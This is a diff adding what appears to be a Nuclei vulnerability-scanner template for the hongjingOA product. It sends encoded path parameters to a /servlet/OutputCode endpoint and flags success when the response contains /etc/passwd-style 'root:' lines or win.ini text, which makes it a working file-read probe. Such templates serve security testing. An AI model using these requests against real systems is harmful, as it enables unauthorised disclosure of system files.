@@ -1,0 +1,28 @@
+id: hongjingOA
+
+info:
+  name: hongjingOA
+  author: Momika233
+  severity: high
+  reference:
+    - https://github.com/momika233
+  tags: hongjingOA
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/servlet/OutputCode?path=Ix1E5Anj26gg4vfnak8pSKVU3Fi5TGhY'
+      - '{{BaseURL}}/servlet/OutputCode?path=QaHzSRQ~31~33OxiAgey~30gWstj~32~37va~39~32BSE~30DEBXPAATTP~32HJFPAATTPrGDABkY~34P~37~36rAis~38LWQntWOE~38He'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "; for 16-bit.*"
+          - "root:.*"
+        part: body
+
+      - type: status
+        status:
+          - 200
